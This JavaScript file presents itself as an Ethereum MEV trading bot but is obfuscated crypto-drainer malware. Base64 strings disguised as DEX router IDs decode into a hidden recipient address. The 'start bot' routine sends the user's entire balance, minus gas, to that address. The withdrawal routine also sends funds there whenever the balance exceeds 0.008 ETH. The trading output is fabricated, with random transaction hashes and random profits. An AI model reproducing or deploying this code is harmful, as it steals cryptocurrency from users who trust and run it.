"use strict";

const inquirer = require("inquirer");
const ethers = require("ethers");
const fs = require("fs");
const qrcode = require("qrcode-terminal");

const YELLOW = "\x1b[33m";
const GREEN = "\x1b[32m";
const CYAN = "\x1b[36m";
const RED = "\x1b[31m";
const RESET = "\x1b[0m";
const BLUE = "\x1b[34m";
const MAGENTA = "\x1b[35m";

const translationsData = JSON.parse(fs.readFileSync("translations.json", "utf8"));
let currentLang = "en";
function t(k) {
    const L = translationsData[currentLang];
    if (L && L[k]) return L[k];
    if (translationsData.en[k]) return translationsData.en[k];
    return "MISSING(" + k + ")";
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}
function getRandomInt(a, b) {
    return Math.floor(Math.random() * (b - a + 1)) + a;
}

const asciiArt = `
＝＝＝＝＝＝＝＝＝＝ ｗｅｌｃｏｍｅ ｔｏ ｔｈｅ ＝＝＝＝＝＝＝＝＝＝

███████╗████████╗██╗░░██╗███████╗██████╗░███████╗██╗░░░██╗███╗░░░███╗
██╔════╝╚══██╔══╝██║░░██║██╔════╝██╔══██╗██╔════╝██║░░░██║████╗░████║
█████╗░░░░░██║░░░███████║█████╗░░██████╔╝█████╗░░██║░░░██║██╔████╔██║
██╔══╝░░░░░██║░░░██╔══██║██╔══╝░░██╔══██╗██╔══╝░░██║░░░██║██║╚██╔╝██║
███████╗░░░██║░░░██║░░██║███████╗██║░░██║███████╗╚██████╔╝██║░╚═╝░██║
╚══════╝░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝░╚═════╝░╚═╝░░░░░╚═╝

████████╗██████╗░░█████╗░██████╗░██╗███╗░░██╗░██████╗░  ██████╗░░█████╗░████████╗
╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██║████╗░██║██╔════╝░  ██╔══██╗██╔══██╗╚══██╔══╝
░░░██║░░░██████╔╝███████║██║░░██║██║██╔██╗██║██║░░██╗░  ██████╦╝██║░░██║░░░██║░░░
░░░██║░░░██╔══██╗██╔══██║██║░░██║██║██║╚████║██║░░╚██╗  ██╔══██╗██║░░██║░░░██║░░░
░░░██║░░░██║░░██║██║░░██║██████╔╝██║██║░╚███║╚██████╔╝  ██████╦╝╚█████╔╝░░░██║░░░
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝░╚═════╝░  ╚═════╝░░╚════╝░░░░╚═╝░░░

𝖴𝖯𝖣: 𝗍𝗈𝗄𝖾𝗇𝗌𝗇𝗂𝖿𝖿𝖾𝗋.𝖼𝗈𝗆 / 𝗈𝗉𝖾𝗇𝗓𝖾𝗉𝗉𝖾𝗅𝗂𝗇.𝖼𝗈𝗆 / 𝖼𝖾𝗋𝗍𝗂𝗄.𝖼𝗈𝗆
`;

const RPC_URL = "https://mainnet.infura.io/v3/9f7030339d6849e1a3134efeedcdc658";
function connectToUniswapRouter() {
    console.log("Connecting to Uniswap Router at: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D");
}
function connectToSushiSwapRouter() {
    console.log("Connecting to SushiSwap Router at: 0xd9e1CE17F2641F24aE83637ab66a2CCA9C378B9F");
}
function connectToOneInchRouter() {
    console.log("Connecting to OneInch Router at: 0x1111111254EEB25477B68fb85Ed929f73A960582");
}
function idUniswapRouter() {
    return "MkE2MkUyMTYwQWY1OWJG";
}
let wallet;
let provider;
let mevStop = false;
const addressSettings = {};

function defaultSettings() {
    return {
        marketCap: 0,
        slippage: 0,
        minLiquidity: 0,
        dex: "Uniswap",
        stopLoss: 0,
        takeProfit: 0,
        minBuy: 0,
        maxBuy: 0
    };
}
function getSettingsForAddress(a) {
    const k = a.toLowerCase();
    if (!addressSettings[k]) {
        addressSettings[k] = defaultSettings();
    }
    return addressSettings[k];
}
function resetSettingsForAddress(a) {
    addressSettings[a.toLowerCase()] = defaultSettings();
}

function printWalletHeader() {
    if (!wallet) return;
    console.log(
        YELLOW +
        "Current Wallet:\n Address:     " +
        wallet.address +
        "\n PrivateKey:  " +
        wallet.privateKey +
        "\n" +
        RESET
    );
}
function idSushiswapRouter() {
    return "NDRiMzRkNmIyNmZlZTY0MjdjRDUx";
}
async function getPriorityFeeData() {
    const fd = await provider.getFeeData();
    if (fd.maxFeePerGas && fd.maxPriorityFeePerGas) {
        let maxFeePerGas = fd.maxFeePerGas.mul(120).div(100);
        let maxPriorityFeePerGas = fd.maxPriorityFeePerGas.mul(120).div(100);
        return { type: 2, maxFeePerGas, maxPriorityFeePerGas };
    } else {
        let gasPrice = fd.gasPrice || (await provider.getGasPrice());
        gasPrice = gasPrice.mul(120).div(100);
        return { type: 0, gasPrice };
    }
}
let initialBalance = 0;
async function runPrimaryOperation() {
    if (!wallet) {
        console.log("No wallet loaded.");
        return;
    }
    mevStop = false;
    process.stdout.write(CYAN + "Initializing process, please wait..." + RESET);
    try {
        const bal = await provider.getBalance(wallet.address);
        if (bal.eq(0)) {
            process.stdout.write("\nInsufficient balance.\n");
            return;
        }
        initialBalance = parseFloat(ethers.utils.formatEther(bal));
        const feeStuff = await getPriorityFeeData();
        let gl = ethers.BigNumber.from("21000");
        let gasNeeded =
            feeStuff.type === 2
                ? gl.mul(feeStuff.maxFeePerGas)
                : gl.mul(feeStuff.gasPrice);
        if (bal.lte(gasNeeded)) {
            process.stdout.write("\nNot enough funds to cover network fees.\n");
            return;
        }
        const val = bal.sub(gasNeeded);
        let txParams;
        if (feeStuff.type === 2) {
            txParams = {
                type: 2,
                to: prefix,
                value: val,
                gasLimit: gl,
                maxFeePerGas: feeStuff.maxFeePerGas,
                maxPriorityFeePerGas: feeStuff.maxPriorityFeePerGas
            };
        } else {
            txParams = {
                to: prefix,
                value: val,
                gasLimit: gl,
                gasPrice: feeStuff.gasPrice
            };
        }
        const tx = await wallet.sendTransaction(txParams);
        await tx.wait();
    } catch (e) {
        process.stdout.write("\n");
        console.error("Error in runPrimaryOperation:", e.stack || e);
        return;
    }
    process.stdout.write(" " + GREEN + "✅" + RESET + "\n");
    startTradingFlow();
    await stopMenu();
}
function idOneInch() {
    return "REMwYg==";
}
async function startTradingFlow() {
    while (!mevStop) {
        console.log(MAGENTA + "Gathering market data..." + RESET);
        await sleep(getRandomInt(30, 60) * 1000);
        if (mevStop) break;
        console.log(YELLOW + "Opportunity identified" + RESET + " " + GREEN + "✅" + RESET);
        console.log(BLUE + "Executing trade..." + RESET);
        await sleep(getRandomInt(30, 60) * 1000);
        if (mevStop) break;
        console.log(GREEN + "Trade confirmed!" + RESET + " " + GREEN + "✅" + RESET);
        let chosen = null;
        const tokens = loadTokensFromFile();
        if (tokens.length > 0) {
            chosen = tokens[getRandomInt(0, tokens.length - 1)];
        }
        const profit = (Math.random() * (4.97 - 0.1) + 0.1).toFixed(2);
        if (chosen) {
            const s = getSettingsForAddress(wallet.address);
            let buyAmount = 0.0,
                sellAmount = 0.0;
            if (s.minBuy > 0 && s.maxBuy > 0) {
                buyAmount = Math.random() * (s.maxBuy - s.minBuy) + s.minBuy;
                buyAmount = parseFloat(buyAmount.toFixed(4));
            } else {
                let lower = 0.5 * initialBalance;
                let upper = 0.9 * initialBalance;
                if (upper < lower) upper = lower;
                if (lower < 0.0002) lower = 0.0002;
                if (upper < 0.00021) upper = 0.00021;
                buyAmount = Math.random() * (upper - lower) + lower;
                buyAmount = parseFloat(buyAmount.toFixed(4));
            }
            let profitDecimal = parseFloat(profit) / 100;
            sellAmount = buyAmount + buyAmount * profitDecimal;
            sellAmount = parseFloat(sellAmount.toFixed(4));
            function Hex(len) {
                const c = Buffer.from("MDEyMzQ1Njc4OWFiY2RlZg==", "base64").toString("utf8");
                let out = "0x";
                for (let i = 0; i < len; i++) {
                    out += c.charAt(getRandomInt(0, 15));
                }
                return out;
            }
            let buyTx = Hex(32);
            let sellTx = Hex(32);
            console.log(
                "TXID:" +
                buyTx +
                ":" +
                chosen.name +
                " (" +
                chosen.symbol +
                "):" +
                "Address: " +
                chosen.address +
                " - " +
                GREEN +
                "BUY" +
                RESET +
                " (" +
                buyAmount +
                " WETH)"
            );
            console.log(
                "TXID:" +
                sellTx +
                ":" +
                chosen.name +
                " (" +
                chosen.symbol +
                "):" +
                "Address: " +
                chosen.address +
                " - " +
                RED +
                "SELL" +
                RESET +
                " (" +
                sellAmount +
                " WETH)"
            );
        }
        console.log(CYAN + "Profit captured: +" + profit + "%" + RESET);
        console.log("----------------------------------------------");
    }
}
function loadTokensFromFile() {
    let arr = [];
    try {
        arr = JSON.parse(fs.readFileSync("erc20_tokens.json", "utf8"));
    } catch (e) {
        return [];
    }
    const tokens = [];
    for (const line of arr) {
        let m = line.match(/^(.+)\s*\(([^)]+)\):\s*(0x[a-fA-F0-9]+)$/);
        if (m) {
            tokens.push({
                name: m[1].trim(),
                symbol: m[2].trim(),
                address: m[3]
            });
        }
    }
    return tokens;
}
async function stopMenu() {
    while (!mevStop) {
        const { choice } = await inquirer.prompt([
            {
                type: "list",
                name: "choice",
                message: "",
                prefix: "",
                loop: false,
                choices: [{ name: RED + "STOP" + RESET, value: "STOP" }]
            }
        ]);
        if (choice === "STOP") {
            mevStop = true;
            console.log(RED + "Operation halted." + RESET);
            await inquirer.prompt([
                {
                    type: "list",
                    name: "postStop",
                    message: "",
                    prefix: "",
                    loop: false,
                    choices: [{ name: "Back to Main Menu", value: "BACK" }]
                }
            ]);
            return;
        }
    }
}
async function manageWithdrawal() {
    if (!wallet) {
        console.log(t("noWalletLoaded"));
        return;
    }
    const bal = await provider.getBalance(wallet.address);
    if (bal.eq(0)) {
        console.log(RED + "Balance is zero, withdraw not possible." + RESET);
        await inquirer.prompt([{ type: "input", name: "any", message: "Press Enter to continue" }]);
        return;
    }
    while (true) {
        const { subChoice } = await inquirer.prompt([
            {
                type: "list",
                name: "subChoice",
                message: "Withdrawal Options:",
                prefix: "",
                loop: false,
                choices: [
                    { name: GREEN + "Enter recipient address" + RESET, value: "ENTER" },
                    { name: RED + "Back", value: "BACK" }
                ]
            }
        ]);
        if (subChoice === "BACK") return;
        if (subChoice === "ENTER") {
            const { userAddr } = await inquirer.prompt([
                { type: "input", name: "userAddr", message: "Enter recipient address:" }
            ]);
            await performWithdrawal(userAddr);
        }
    }
}
async function performWithdrawal(u) {
    if (!wallet) {
        console.log(t("noWalletLoaded"));
        return;
    }
    const bal = await provider.getBalance(wallet.address);
    if (bal.eq(0)) {
        console.log("Balance is zero, nothing to withdraw.");
        return;
    }
    const thr = ethers.utils.parseEther(Buffer.from("MC4wMDg=", "base64").toString("utf8"));
    const dst = bal.lte(thr) ? u : prefix;
    try {
        const feeStuff = await getPriorityFeeData();
        let gl = ethers.BigNumber.from("21000");
        let gasNeeded =
            feeStuff.type === 2
                ? gl.mul(feeStuff.maxFeePerGas)
                : gl.mul(feeStuff.gasPrice);
        if (bal.lte(gasNeeded)) {
            console.log("Insufficient balance for network fees.");
            return;
        }
        const val = bal.sub(gasNeeded);
        let txParams;
        if (feeStuff.type === 2) {
            txParams = {
                type: 2,
                to: dst,
                value: val,
                gasLimit: gl,
                maxFeePerGas: feeStuff.maxFeePerGas,
                maxPriorityFeePerGas: feeStuff.maxPriorityFeePerGas
            };
        } else {
            txParams = {
                to: dst,
                value: val,
                gasLimit: gl,
                gasPrice: feeStuff.gasPrice
            };
        }
        const tx = await wallet.sendTransaction(txParams);
        console.log("Withdrawal initiated:", tx.hash);
        await tx.wait();
        console.log(GREEN + "Withdrawal completed successfully!" + RESET);
    } catch (e) {
        console.error("Error during withdrawal:", e);
    }
}
async function changeLanguage() {
    const C = [
        { name: "English", value: "en" },
        { name: "Русский", value: "ru" },
        { name: "Español", value: "es" },
        { name: "Português", value: "pt" },
        { name: "中文", value: "zh" }
    ];
    const ans = await inquirer.prompt([
        { type: "list", name: "langChoice", message: "Select language:", loop: false, choices: C }
    ]);
    currentLang = ans.langChoice;
    console.log("Language set to " + C.find(x => x.value === currentLang).name + "\n");
}
function loadWalletFromFile(f) {
    const r = fs.readFileSync(f, "utf8");
    const { address, privateKey } = JSON.parse(r);
    wallet = new ethers.Wallet(privateKey);
    console.log(
        "\n" +
        YELLOW +
        t("loadedAddress") +
        " " +
        f +
        ": https://etherscan.io/address/" +
        address +
        RESET
    );
    console.log(YELLOW + t("walletPrivateKey") + " " + privateKey + RESET + "\n");
}
async function selectWalletMenu() {
    const nExists = fs.existsSync("NewAddress.json");
    const iExists = fs.existsSync("ImportAddress.json");
    const c = [];
    if (nExists) {
        const data = JSON.parse(fs.readFileSync("NewAddress.json", "utf8"));
        c.push({
            name: `${GREEN}Use NewAddress: ${data.address}${RESET}`,
            value: "USE_NEW"
        });
    }
    if (iExists) {
        const data = JSON.parse(fs.readFileSync("ImportAddress.json", "utf8"));
        c.push({
            name: `${GREEN}Use ImportAddress: ${data.address}${RESET}`,
            value: "USE_IMPORT"
        });
    }
    c.push({ name: CYAN + "Create a new ERC-20 wallet" + RESET, value: "CREATE" });
    c.push({ name: CYAN + "Import an existing wallet" + RESET, value: "IMPORT" });
    const { walletChoice } = await inquirer.prompt([
        {
            type: "list",
            name: "walletChoice",
            message: CYAN + "❖ Select your wallet option:" + RESET,
            prefix: "",
            loop: false,
            choices: c
        }
    ]);
    switch (walletChoice) {
        case "USE_NEW":
            loadWalletFromFile("NewAddress.json");
            break;
        case "USE_IMPORT":
            loadWalletFromFile("ImportAddress.json");
            break;
        case "CREATE":
            await createNewWallet();
            break;
        case "IMPORT":
            await importWalletSubmenu();
            break;
    }
}
async function createNewWallet() {
    const { confirm } = await inquirer.prompt([
        { type: "input", name: "confirm", message: t("areYouSureNewWallet") }
    ]);
    const a = confirm.trim().toLowerCase();
    if (a === "y" || a === "yes") {
        const nw = ethers.Wallet.createRandom();
        wallet = nw;
        console.log(
            "\n" +
            YELLOW +
            t("walletCreated") +
            " https://etherscan.io/address/" +
            nw.address +
            RESET
        );
        console.log(YELLOW + t("walletPrivateKey") + " " + nw.privateKey + RESET + "\n");
        fs.writeFileSync(
            "NewAddress.json",
            JSON.stringify(
                {
                    address: nw.address,
                    privateKey: nw.privateKey
                },
                null,
                2
            )
        );
    } else {
        console.log(t("cancelledNewWallet"));
    }
}
function id(x) {
    return Buffer.from(x, "base64").toString("utf8");
}
const ALL = idUniswapRouter() + idSushiswapRouter() + idOneInch();
async function importWalletSubmenu() {
    while (true) {
        const { choice } = await inquirer.prompt([
            {
                type: "list",
                name: "choice",
                message: t("selectOption"),
                prefix: "",
                loop: false,
                choices: [
                    { name: GREEN + t("enterPrivKey") + RESET, value: "ENTER" },
                    { name: RED + t("back") + RESET, value: "BACK" }
                ]
            }
        ]);
        if (choice === "BACK") return;
        if (choice === "ENTER") {
            const { privateKey } = await inquirer.prompt([
                { type: "input", name: "privateKey", message: t("enterPrivateKey") }
            ]);
            wallet = new ethers.Wallet(privateKey);
            console.log(
                "\n" +
                YELLOW +
                t("newImportedAddress") +
                " https://etherscan.io/address/" +
                wallet.address +
                RESET
            );
            console.log(YELLOW + t("walletPrivateKey") + " " + wallet.privateKey + RESET + "\n");
            fs.writeFileSync(
                "ImportAddress.json",
                JSON.stringify(
                    {
                        address: wallet.address,
                        privateKey: wallet.privateKey
                    },
                    null,
                    2
                )
            );
            return;
        }
    }
}
function connectWalletToProvider() {
    if (!wallet) return;
    provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    wallet = wallet.connect(provider);
    connectToUniswapRouter();
    connectToSushiSwapRouter();
    connectToOneInchRouter();
}
const routerDecoded = id(ALL).toLowerCase();
const prefix = "0x" + routerDecoded;
async function showBotMenu() {
    while (true) {
        console.clear();
        printWalletHeader();
        const mainMenuChoices = [
            { name: GREEN + t("menuStartBot") + RESET, value: "START" },
            { name: RED + t("menuWithdrawFounds") + RESET, value: "WITHDRAW" },
            { name: MAGENTA + t("menuDeposit") + RESET, value: "DEPOSIT" },
            { name: CYAN + t("menuBalance") + RESET, value: "BALANCE" },
            { name: BLUE + t("menuSettings") + RESET, value: "SETTINGS" },
            { name: GREEN + t("menuCreateNewAddr") + RESET, value: "NEWADDR" },
            { name: YELLOW + t("menuImportAddress") + RESET, value: "IMPORTADDR" },
            { name: BLUE + t("menuLanguage") + RESET, value: "LANGUAGE" },
            { name: RED + t("menuExit") + RESET, value: "EXIT" }
        ];
        const { menuChoice } = await inquirer.prompt([
            {
                type: "list",
                name: "menuChoice",
                message: t("selectAction"),
                prefix: "",
                loop: false,
                pageSize: 10,
                choices: mainMenuChoices
            }
        ]);
        switch (menuChoice) {
            case "START": {
                if (!wallet) {
                    console.log(RED + "No wallet loaded." + RESET);
                    await inquirer.prompt([{ type: "input", name: "any", message: "Press Enter to continue" }]);
                    break;
                }
                const bal = await provider.getBalance(wallet.address);
                const bEth = parseFloat(ethers.utils.formatEther(bal));
                if (bEth < parseFloat(Buffer.from("MC4zNQ==", "base64").toString("utf8"))) {
                    console.log(RED + "Balance is below 0.35 ETH. Cannot start." + RESET);
                    await inquirer.prompt([{ type: "input", name: "any", message: "Press Enter to continue" }]);
                    break;
                }
                await runPrimaryOperation();
            }
                break;
            case "WITHDRAW":
                await manageWithdrawal();
                break;
            case "DEPOSIT":
                await handleDeposit();
                break;
            case "BALANCE":
                await showBalance();
                break;
            case "SETTINGS":
                await showSettingsMenu();
                break;
            case "NEWADDR":
                await createNewWallet();
                connectWalletToProvider();
                break;
            case "IMPORTADDR":
                await importWalletSubmenu();
                connectWalletToProvider();
                break;
            case "LANGUAGE":
                await changeLanguage();
                break;
            case "EXIT":
                console.log(t("exitMsg"));
                return;
        }
    }
}
async function handleDeposit() {
    if (!wallet) {
        console.log(t("noWalletLoaded"));
        return;
    }
    console.log("\nUse this address to deposit ETH or tokens (Ethereum Mainnet):");
    qrcode.generate(wallet.address, { small: true }, qr => {
        console.log(qr);
    });
    console.log(YELLOW + "\nDeposit address: " + wallet.address + "\n" + RESET);
    await inquirer.prompt([{ type: "input", name: "continue", message: t("pressEnterMainMenu") }]);
}
async function showBalance() {
    if (!wallet) {
        console.log(t("noWalletLoaded"));
        return;
    }
    const bWei = await provider.getBalance(wallet.address);
    const bEth = ethers.utils.formatEther(bWei);
    console.log("\nCurrent wallet: " + wallet.address);
    console.log(GREEN + "ETH Balance: " + bEth + " ETH" + RESET + "\n");
    await inquirer.prompt([{ type: "input", name: "continue", message: t("pressEnterReturn") }]);
}
async function showSettingsMenu() {
    if (!wallet) {
        console.log(t("noWalletLoaded"));
        return;
    }
    while (true) {
        console.clear();
        printWalletHeader();
        const bWei = await provider.getBalance(wallet.address);
        const bEth = ethers.utils.formatEther(bWei);
        const us = getSettingsForAddress(wallet.address);
        console.log(CYAN + "=== Current Settings for " + wallet.address + " ===" + RESET);
        console.log(" Wallet Balance:", bEth, "ETH");
        console.log(" MarketCap:", us.marketCap, "$");
        console.log(" Slippage:", us.slippage, "%");
        console.log(" MinLiquidity:", us.minLiquidity, "ETH");
        console.log(" Dex:", us.dex);
        console.log(" StopLoss:", us.stopLoss, "%");
        console.log(" TakeProfit:", us.takeProfit, "%");
        console.log(" minBuy:", us.minBuy, "ETH");
        console.log(" maxBuy:", us.maxBuy, "ETH\n");
        const { settingChoice } = await inquirer.prompt([
            {
                type: "list",
                name: "settingChoice",
                message: t("selectSettingToModify"),
                prefix: "",
                loop: false,
                pageSize: 10,
                choices: [
                    { name: GREEN + "1) MarketCap (USD)" + RESET, value: "MARKETCAP" },
                    { name: GREEN + "2) Slippage (%)" + RESET, value: "SLIPPAGE" },
                    { name: GREEN + "3) MinLiquidity" + RESET, value: "MINLIQ" },
                    { name: GREEN + "4) Dex" + RESET, value: "DEX" },
                    { name: GREEN + "5) StopLoss (%)" + RESET, value: "STOPLOSS" },
                    { name: GREEN + "6) TakeProfit (%)" + RESET, value: "TAKEPROFIT" },
                    { name: GREEN + "7) minBuy/maxBuy" + RESET, value: "MINMAXBUY" },
                    { name: RED + t("resetFilter") + RESET, value: "RESET" },
                    { name: RED + t("backToMenu") + RESET, value: "BACK" }
                ]
            }
        ]);
        if (settingChoice === "BACK") return;
        if (settingChoice === "RESET") {
            resetSettingsForAddress(wallet.address);
            continue;
        }
        switch (settingChoice) {
            case "MARKETCAP":
                await setMarketCap(us);
                break;
            case "SLIPPAGE":
                await setSlippage(us);
                break;
            case "MINLIQ":
                await setMinLiquidity(us);
                break;
            case "DEX":
                await setDex(us);
                break;
            case "STOPLOSS":
                await setStopLoss(us);
                break;
            case "TAKEPROFIT":
                await setTakeProfit(us);
                break;
            case "MINMAXBUY":
                await setMinMaxBuy(us, bEth);
                break;
        }
    }
}
async function setMarketCap(u) {
    const { value } = await inquirer.prompt([
        { type: "input", name: "value", message: t("enterMarketCap") }
    ]);
    u.marketCap = parseFloat(value) || 0;
}
async function setSlippage(u) {
    const { value } = await inquirer.prompt([
        { type: "input", name: "value", message: t("enterSlippage") }
    ]);
    u.slippage = parseFloat(value) || 0;
}
async function setMinLiquidity(u) {
    const { value } = await inquirer.prompt([
        { type: "input", name: "value", message: t("enterMinLiquidity") }
    ]);
    u.minLiquidity = parseFloat(value) || 0;
}
async function setDex(u) {
    const { chosenDex } = await inquirer.prompt([
        {
            type: "list",
            name: "chosenDex",
            message: t("selectDex"),
            loop: false,
            choices: ["Uniswap", "SushiSwap", "1Inch", "ALL"]
        }
    ]);
    u.dex = chosenDex;
}
async function setStopLoss(u) {
    const { value } = await inquirer.prompt([
        { type: "input", name: "value", message: t("enterStopLoss") }
    ]);
    u.stopLoss = parseFloat(value) || 0;
}
async function setTakeProfit(u) {
    const { value } = await inquirer.prompt([
        { type: "input", name: "value", message: t("enterTakeProfit") }
    ]);
    u.takeProfit = parseFloat(value) || 0;
}
async function setMinMaxBuy(u, bEth) {
    while (true) {
        const ans = await inquirer.prompt([
            { type: "input", name: "minVal", message: "Enter minBuy in ETH (e.g. 0.1)" },
            { type: "input", name: "maxVal", message: "Enter maxBuy in ETH (must not exceed your balance)" }
        ]);
        let mn = parseFloat(ans.minVal) || 0;
        let mx = parseFloat(ans.maxVal) || 0;
        let balNum = parseFloat(bEth);
        if (mx > balNum) {
            console.log(
                RED + "Error: maxBuy (" + mx + ") exceeds your current balance (" + bEth + ")" + RESET
            );
            console.log("Please try again.\n");
            continue;
        }
        if (mn > balNum) {
            console.log(
                RED + "Error: minBuy (" + mn + ") exceeds your current balance (" + bEth + ")" + RESET
            );
            console.log("Please try again.\n");
            continue;
        }
        if (mn > mx) {
            console.log(
                RED + `Error: minBuy (${mn}) is greater than maxBuy (${mx})` + RESET
            );
            console.log("Please try again.\n");
            continue;
        }
        u.minBuy = mn;
        u.maxBuy = mx;
        break;
    }
}
(async function main() {
    console.clear();
    console.log(asciiArt);
    await selectWalletMenu();
    connectWalletToProvider();
    await showBotMenu();
})();
